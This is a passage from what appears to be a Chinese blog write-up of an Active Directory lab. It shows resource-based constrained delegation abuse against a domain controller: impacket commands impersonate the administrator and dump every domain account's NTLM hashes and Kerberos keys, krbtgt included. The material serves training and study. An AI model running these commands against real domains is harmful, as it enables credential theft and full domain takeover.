+Adding new computer with username: mj$ and password: ?Q+2H_P{eJJk$@m result: OK
+<p>set_rbcd XR-DC01$ mj$<br>
+Found Target DN: CN=XR-DC01,OU=Domain Controllers,DC=xiaorang,DC=lab<br>
+Target SID: S-1-5-21-3745972894-1678056601-2622918667-1000</p>
+</code><p><code class="notranslate">Found Grantee DN: CN=mj,CN=Computers,DC=xiaorang,DC=lab<br>
+Grantee SID: S-1-5-21-3745972894-1678056601-2622918667-1147<br>
+Delegation rights modified successfully!<br>
+mj$ can now impersonate users on XR-DC01$ via S4U2Proxy<br>
+exit<br>
+</code></p></pre><p></p>
+<p>然后装域管拿TGT，并且导入票据</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc -q impacket-getST -spn cifs/XR-DC01.xiaorang.lab -impersonate administrator -dc-ip 172.22.15.13 'xiaorang.lab/mj$:?Q+2H_P{eJJk$@m'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+<p>[-] CCache file is not found. Skipping...<br>
+[<em>] Getting TGT for user<br>
+[</em>] Impersonating administrator<br>
+[<em>] Requesting S4U2self<br>
+[</em>] Requesting S4U2Proxy<br>
+[*] Saving ticket in administrator@<a href="mailto:cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccache">cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccache</a></p>
+</code><p><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]<br>
+└─# export KRB5CCNAME=administrator@<a href="mailto:cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccache">cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccache</a><br>
+</code></p></pre><p></p>
+<p>dump全域hash</p>
+<pre class="notranslate"><code class="notranslate">pc -q impacket-secretsdump -k -no-pass -just-dc -dc-ip 172.22.15.13 -target-ip 172.22.15.13 'xiaorang.lab/administrator@XR-DC01.xiaorang.lab'
+<p>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</p>
+</code><p><code class="notranslate">[<em>] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>
+[</em>] Using the DRSUAPI method to get NTDS.DIT secrets<br>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:26b321bde63de24097cd6610547e858b:::<br>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2470506fc14346a968a6cbbce1f938e5:::<br>
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+wangxiuzhen:1105:aad3b435b51404eeaad3b435b51404ee:d980a693e6b945c6e1d3d7697385f4c0:::<br>
+liyuying:1106:aad3b435b51404eeaad3b435b51404ee:4e77dc688f87c4ebbbe1da95931d25d1:::<br>
+wangyuying:1107:aad3b435b51404eeaad3b435b51404ee:f09d261da7841e97bc25e5a95833ee4a:::<br>
+zhoumin:1109:aad3b435b51404eeaad3b435b51404ee:fad94b7c69cdbc4376fb17dc78cc858e:::<br>
+chenmei:1111:aad3b435b51404eeaad3b435b51404ee:d53b17e5763bb9f028211044a32a9267:::<br>
+huangmin:1112:aad3b435b51404eeaad3b435b51404ee:9c75fa751d66813d7ed4caa6d2d9af38:::<br>
+jiangcheng:1113:aad3b435b51404eeaad3b435b51404ee:9c75fa751d66813d7ed4caa6d2d9af38:::<br>
+huanggang:1114:aad3b435b51404eeaad3b435b51404ee:9c75fa751d66813d7ed4caa6d2d9af38:::<br>
+machao:1115:aad3b435b51404eeaad3b435b51404ee:9a504875c8fc24ea22c3a27152ed3273:::<br>
+lihongxia:1116:aad3b435b51404eeaad3b435b51404ee:90dac5e942acd6ef50ad6b4de8167da4:::<br>
+wangxiuhua:1117:aad3b435b51404eeaad3b435b51404ee:0c1b09b6a9ab9f9d1ab46315be2ea9c7:::<br>
+wangtingting:1118:aad3b435b51404eeaad3b435b51404ee:6490f879c10ed6abe56e9fdf0466848c:::<br>
+liguihua:1119:aad3b435b51404eeaad3b435b51404ee:88c540dbe639451a04a5183ea0e0af0d:::<br>
+lilanying:1121:aad3b435b51404eeaad3b435b51404ee:1dcd36745029a8cb021a7ea2515634e7:::<br>
+liguizhi:1122:aad3b435b51404eeaad3b435b51404ee:51c00743fa6f148926694c830112ae33:::<br>
+wangyulan:1123:aad3b435b51404eeaad3b435b51404ee:9b57eb71d89ba4003558cc451c3393ef:::<br>
+wangxiuying:1124:aad3b435b51404eeaad3b435b51404ee:e229d51427368fe6a64d780c99c73a01:::<br>
+wangshuzhen:1125:aad3b435b51404eeaad3b435b51404ee:ec15ace457a567262f5684833b53b49d:::<br>
+huachunmei:1126:aad3b435b51404eeaad3b435b51404ee:f67f5e3f66efd7298be6acd32eeeb27c:::<br>
+jiadongmei:1127:aad3b435b51404eeaad3b435b51404ee:6ac97d0534c99743bfa52ed5584e916b:::<br>
+yangguiying:1128:aad3b435b51404eeaad3b435b51404ee:dff3cc2345c4650149fd13af7b569a37:::<br>
+liguilan:1129:aad3b435b51404eeaad3b435b51404ee:c337e57ca73c99e1eb1da443425da58b:::<br>
+yuxuecheng:1130:aad3b435b51404eeaad3b435b51404ee:cfc4835a206d618f1d7ea2bc22cc49ac:::<br>
+lixiuying:1131:aad3b435b51404eeaad3b435b51404ee:ad65e2482dd702903eefe4b721d3a494:::<br>
+zhangxiuying:1132:aad3b435b51404eeaad3b435b51404ee:8b30503a779d10de17744bb56ee15b8c:::<br>
+wangshuhua:1133:aad3b435b51404eeaad3b435b51404ee:667454046d29e985b63a7931f4b9219d:::<br>
+wangxiulan:1134:aad3b435b51404eeaad3b435b51404ee:df0febe8871e463155401c3d896244fc:::<br>
+chenjianhua:1136:aad3b435b51404eeaad3b435b51404ee:5e121c3d4d259f35917c9c666c7c3650:::<br>
+tiangui:1137:aad3b435b51404eeaad3b435b51404ee:8b30503a779d10de17744bb56ee15b8c:::<br>
+tianwen:1138:aad3b435b51404eeaad3b435b51404ee:667454046d29e985b63a7931f4b9219d:::<br>
+tianshengli:1139:aad3b435b51404eeaad3b435b51404ee:df0febe8871e463155401c3d896244fc:::<br>
+tianlong:1141:aad3b435b51404eeaad3b435b51404ee:5e121c3d4d259f35917c9c666c7c3650:::<br>
+XR-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:39dbde586385c5b496eb39eca148c2fb:::<br>
+XR-0687$:1103:aad3b435b51404eeaad3b435b51404ee:f09d92a4863246046b24bcbda4569483:::<br>
+XR-CA$:1104:aad3b435b51404eeaad3b435b51404ee:90b63a78b0452b4479117fb983da81e8:::<br>
+mj$:1147:aad3b435b51404eeaad3b435b51404ee:54effe3b0ca6ec9e1e8e32a2b5597574:::<br>
+[*] Kerberos keys grabbed<br>
+Administrator:aes256-cts-hmac-sha1-96:6e0f5189ed31b54ec7e8b8a7e6b03eea065ec3d7be71a7b83e43a5a325491eab<br>
+Administrator:aes128-cts-hmac-sha1-96:adde12aef60c2dbf1fae6b50e9ba6d9d<br>
+Administrator:des-cbc-md5:abe0617045e90b2a<br>
+Administrator:dec-cbc-crc:abe0617045e90b2a<br>
+krbtgt:aes256-cts-hmac-sha1-96:bd2efa1c7ffab0346f46496fdbbd468eba86464560de286f612d0b056f70d44c<br>
+krbtgt:aes128-cts-hmac-sha1-96:d55d412c379c4769c36ba4155270cf96<br>
+krbtgt:des-cbc-md5:40f1fd16b0fbda5b<br>
+wangxiuzhen:aes256-cts-hmac-sha1-96:3d3ba0ff6089a98b1b986009fe3c2ae7a783f501d32f7b6b9f71791d8d9c5cbe<br>
+wangxiuzhen:aes128-cts-hmac-sha1-96:26f219f179d3ddbaf2a8290656f749df<br>
+wangxiuzhen:des-cbc-md5:eccee92ce057c816<br>
+liyuying:aes256-cts-hmac-sha1-96:488901e33ba91b2b58d927797a5ec7f8bede179e6f3b7fba62aac4b9936427c9<br>
+liyuying:aes128-cts-hmac-sha1-96:5cbb47c3d5766dc4d33c613ab6f9a45f<br>
+liyuying:des-cbc-md5:027504a7a820ba07<br>
+wangyuying:aes256-cts-hmac-sha1-96:ed3bd47fce79ad0170f48646647764054b670720e4ad31328e5f50dc191aef2d<br>
+wangyuying:aes128-cts-hmac-sha1-96:0d66d8bfb7de1aaad057270b923edf46<br>
+wangyuying:des-cbc-md5:79918564ab61fe43<br>
+zhoumin:aes256-cts-hmac-sha1-96:46fab8083c4f48489b21b5da3e2fc922ef1f66cfbbc78829b2fc477e4723783d<br>
+zhoumin:aes128-cts-hmac-sha1-96:1bff68920b27915b3f1e917ad981f854<br>
+zhoumin:des-cbc-md5:9dd67c40eff13de3<br>
+chenmei:aes256-cts-hmac-sha1-96:4cd6ffc87bbfccc5310e03680e5bafabca1cb658dececb87642e13dcbd1a7bb1<br>
+chenmei:aes128-cts-hmac-sha1-96:6afadb7a5f030a0181e340d94cb2a76a<br>
+chenmei:des-cbc-md5:70fbabc40b7a29ef<br>
+huangmin:aes256-cts-hmac-sha1-96:3fbff1b76fbe10a02085ff0a7bbd3e7c0e153078a8afe1895b0e10d342f33a28<br>
+huangmin:aes128-cts-hmac-sha1-96:2cfb104d7aaa245c6730fa57f38899f0<br>
+huangmin:des-cbc-md5:970df24ce354fe01<br>
+jiangcheng:aes256-cts-hmac-sha1-96:b10c07048384977f2470005b67dfa9d5e7a17de0fb04d53b49a3e0fb413d0215<br>
+jiangcheng:aes128-cts-hmac-sha1-96:663b9662442e3c99eb4c71f50c83bbf1<br>
+jiangcheng:des-cbc-md5:730e89e3c2835d2a<br>
+huanggang:aes256-cts-hmac-sha1-96:9976b9d8467cadf35251c9c95d860455ebf9297ba518e7fc6794861e9d28d99c<br>
+huanggang:aes128-cts-hmac-sha1-96:91039de3cbdeee790ecaac5067d47566<br>
+huanggang:des-cbc-md5:86a17adf6bad9b8f<br>
+machao:aes256-cts-hmac-sha1-96:850f91e3ffd9d79d803a3a23e28a5308e471d954a6018bffbaf7a44c680e11d0<br>
+machao:aes128-cts-hmac-sha1-96:edf47b1011a703e69df2e35b6a2201f7<br>
+machao:des-cbc-md5:b50dd0ae4fb52619<br>
+lihongxia:aes256-cts-hmac-sha1-96:191240614d1d73d233687da0036764856206e1601026f0761e7b796db91ecdcd<br>
+lihongxia:aes128-cts-hmac-sha1-96:2602f3f49fb226cb1842ae803d4268d1<br>
+lihongxia:des-cbc-md5:4a1f2c923d986186<br>
+wangxiuhua:aes256-cts-hmac-sha1-96:ca6f82b1c4a85910212c39cecac613d4ff438ebd74b542b4fd19199838e9f816<br>
+wangxiuhua:aes128-cts-hmac-sha1-96:0d63d1bfb8f56d1da8969274f567ab8a<br>
+wangxiuhua:des-cbc-md5:c8fdae6ee091a2e6<br>
+wangtingting:aes256-cts-hmac-sha1-96:b24b78464d1a21c917c711dc05e9b411525c5b1e51efe0564473b33381099432<br>
+wangtingting:aes128-cts-hmac-sha1-96:4746b4d887666dccf777a020c6b07c7c<br>
+wangtingting:des-cbc-md5:cbf498ad8338ab62<br>
+liguihua:aes256-cts-hmac-sha1-96:bcb1317ad7701a68c8d5f1f5d8b66522b4aa2b7406cb6e401d8d97a8d75979d8<br>
+liguihua:aes128-cts-hmac-sha1-96:2c6b6bf4e88d5b3872dbcb390372bc3d<br>
+liguihua:des-cbc-md5:68dc9e8591298c2c<br>
+lilanying:aes256-cts-hmac-sha1-96:f437c847ccb120bcb018d93a8eade1ecf3e079cfe9e6d62502ec1d416857cdf4<br>
+lilanying:aes128-cts-hmac-sha1-96:f249bb0d3f4182e6df8722312431e9b6<br>
+lilanying:des-cbc-md5:2ad6bf83a2a8f2da<br>
+liguizhi:aes256-cts-hmac-sha1-96:9e8e1024cb004343e5988ed4b5ebf9530bd2373ec02569f25992a205c9209a11<br>
+liguizhi:aes128-cts-hmac-sha1-96:354350b841cb28956f4d004645c2ee83<br>
+liguizhi:des-cbc-md5:daa22a027c3e205e<br>
+wangyulan:aes256-cts-hmac-sha1-96:0d4a8d53bea31df593d42e4687e79635adf1260d2a0d71b05bb2e04466d01e6d<br>
+wangyulan:aes128-cts-hmac-sha1-96:bc222459b9e2ab8b43c18dbfff6973a7<br>
+wangyulan:des-cbc-md5:898a495258f264bf<br>
+wangxiuying:aes256-cts-hmac-sha1-96:f3bf83cba6b8e8d94de21a2c855936759f142b39713ccf1f360b9345353c58b1<br>
+wangxiuying:aes128-cts-hmac-sha1-96:5d2d5cea38db8b6311e7141c4958db92<br>
+wangxiuying:des-cbc-md5:e3a1a443a4798fbf<br>
+wangshuzhen:aes256-cts-hmac-sha1-96:39065007bfef3978242dab2a005cd44fac3801b6eb2d73fe7fb6678f0f924f25<br>
+wangshuzhen:aes128-cts-hmac-sha1-96:ea226c14b5f5509f504fa3b25d40421a<br>
+wangshuzhen:des-cbc-md5:406215cd2a8ff71f<br>
+huachunmei:aes256-cts-hmac-sha1-96:fd2bc1c03ae32793c09cf35a413ddb2d57f5fdc93b01128d848eace2f7da7d9b<br>
+huachunmei:aes128-cts-hmac-sha1-96:880fdb912ae85ebe53bbbc69124c207d<br>
+huachunmei:des-cbc-md5:ae1a6b6e62191aab<br>
+huachunmei:dec-cbc-crc:ae1a6b6e62191aab<br>
+jiadongmei:aes256-cts-hmac-sha1-96:ffff95cfb208f879f9b2068a0c8b08cdd60639e6b9f703ceec8a5b0c2ccc4334<br>
+jiadongmei:aes128-cts-hmac-sha1-96:d8d36b6ab86f147c82c56d7d65663617<br>
+jiadongmei:des-cbc-md5:fbfd57619bb9fdf7<br>
+yangguiying:aes256-cts-hmac-sha1-96:eab326f64fe45157b1bf2437fb6b83eec4267235602c2c234a317b99197950a6<br>
+yangguiying:aes128-cts-hmac-sha1-96:8479f0eaa660778a3b6e9b4ab6745427<br>
+yangguiying:des-cbc-md5:1c08b6fb7310a7d3<br>
+liguilan:aes256-cts-hmac-sha1-96:7d32d8c89be54ab71d4e7639e978ef785d45d4fa4fb24afad21692198610ea05<br>
+liguilan:aes128-cts-hmac-sha1-96:fa8ac7ca3813c7731b1f2fc9253a0cb9<br>
+liguilan:des-cbc-md5:89b03efb86b9df49<br>
+yuxuecheng:aes256-cts-hmac-sha1-96:433edf2a97d3157630073e2b08a65c27e826df63440f4d0721857f7d3c74969a<br>
+yuxuecheng:aes128-cts-hmac-sha1-96:5e69c8750664229d1ed4a2c309f1f445<br>
+yuxuecheng:des-cbc-md5:d57502da7cfdc715<br>
+lixiuying:aes256-cts-hmac-sha1-96:0085316e516c44dca420726130695394b73e425eb4597f76c897af58fb8c2b27<br>
+lixiuying:aes128-cts-hmac-sha1-96:0c2a366aa8861e7bab0041b58c7ccfd2<br>
+lixiuying:des-cbc-md5:15d061b6ad9275ce<br>
+lixiuying:dec-cbc-crc:15d061b6ad9275ce<br>
+zhangxiuying:aes256-cts-hmac-sha1-96:519b7737380de6b46832e00140bb7e129d166d6a0cb836e5b4a551747d4cfd2e<br>
+zhangxiuying:aes128-cts-hmac-sha1-96:bbbdbfd0cc3449a7bf1cd1c00d998ba9<br>
+zhangxiuying:des-cbc-md5:ea912fab2aa862ec<br>
+wangshuhua:aes256-cts-hmac-sha1-96:3e37a525c5785d26c77df46a7e492547b9c71a3df947e2f29fd66379fa91e77a<br>
+wangshuhua:aes128-cts-hmac-sha1-96:635f186716be3d640b436b3a122424c5<br>
+wangshuhua:des-cbc-md5:3e3e319770a2d516<br>
+wangxiulan:aes256-cts-hmac-sha1-96:148af9ecf6430c01a48edc8d91188bf8bcb8955a2ca31d6032267492d32f5034<br>
+wangxiulan:aes128-cts-hmac-sha1-96:91dd28dbb7645a90d1b85ad6d56e1fe0<br>
+wangxiulan:des-cbc-md5:0eb0fb439ef81919<br>
+chenjianhua:aes256-cts-hmac-sha1-96:f0924fc23af017ce6564b3cc1cd9fabd05fe5b5d8be129be5df65133943f0470<br>
+chenjianhua:aes128-cts-hmac-sha1-96:d1c0724b5498230ed579d769676cde56<br>
+chenjianhua:des-cbc-md5:b3d68ad93e6151fe<br>
+tiangui:aes256-cts-hmac-sha1-96:ea973d77cb1e7553eebf74f252f6e65d3ded442a2e903882130a891b0857ae5c<br>
+tiangui:aes128-cts-hmac-sha1-96:4b0540f9f84c834834b7630ba572b161<br>
+tiangui:des-cbc-md5:57bf1c150bf4163b<br>
+tianwen:aes256-cts-hmac-sha1-96:0d50bde0354833c30284bb4e5105fe6efde9a6d394492c17ebad628abda6a120<br>
+tianwen:aes128-cts-hmac-sha1-96:623189263738cd93d353cc69ed901587<br>
+tianwen:des-cbc-md5:e0f18f37293b4a46<br>
+tianshengli:aes256-cts-hmac-sha1-96:86dd2340322e692dc84a55b58a071193c61aa9f42ccb5313b1e9faea32901a17<br>
+tianshengli:aes128-cts-hmac-sha1-96:a48d66d1a413fbac7a84dd8b36f0018d<br>
+tianshengli:des-cbc-md5:3b5b76839b15b691<br>
+tianlong:aes256-cts-hmac-sha1-96:d1ce4031b5d242c4e6e24831e69dd78147eb7ade76e2cda79459ee10e77e5477<br>
+tianlong:aes128-cts-hmac-sha1-96:860569a4d25b4649055da07b96d2e41f<br>
+tianlong:des-cbc-md5:e9464389858c0ba1<br>
+XR-DC01$:aes256-cts-hmac-sha1-96:0ae1c6e07995db8c545f245203adb8b02d95e798ef8a7edce8225e8181bfe7eb<br>
+XR-DC01$:aes128-cts-hmac-sha1-96:7fb058de630332474cfbc24b32103d4c<br>
+XR-DC01$:des-cbc-md5:2abca123d523d08c<br>
+XR-DC01$:dec-cbc-crc:2abca123d523d08c<br>
+XR-0687$:aes256-cts-hmac-sha1-96:2c85f72ab7d3e606148b8b23db8d19097760d308649e80820a6a8a6ec6badd39<br>
+XR-0687$:aes128-cts-hmac-sha1-96:f504a034c23042393221868bc761a152<br>
+XR-0687$:des-cbc-md5:67d6450d43b9265b<br>
+XR-0687$:dec-cbc-crc:67d6450d43b9265b<br>
+XR-CA$:aes256-cts-hmac-sha1-96:281d927bfda8ea5cf49b29dd8b296b4838262e9cd305cef6b189549b6e5f64ea<br>
+XR-CA$:aes128-cts-hmac-sha1-96:ddd262a761218672863a82160596be43<br>
+XR-CA$:des-cbc-md5:eadcdc25bfcb51d5<br>
+XR-CA$:dec-cbc-crc:eadcdc25bfcb51d5<br>
+mj$:aes256-cts-hmac-sha1-96:025db0d4ab1ae826b0b5adef44fa74498fa466deb00a373051a4b4125999ab27<br>
+mj$:aes128-cts-hmac-sha1-96:2f38ecbb19770becb456d089697f293e<br>
+mj$:des-cbc-md5:3ec849dccd8c4961<br>
+mj$:dec-cbc-crc:3ec849dccd8c4961<br>
+</code></p></pre><p></p>
+<p>然后变成真的域管</p>
+
+</div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://faabbi.github.io">MJ</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","faabbi/faabbi.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
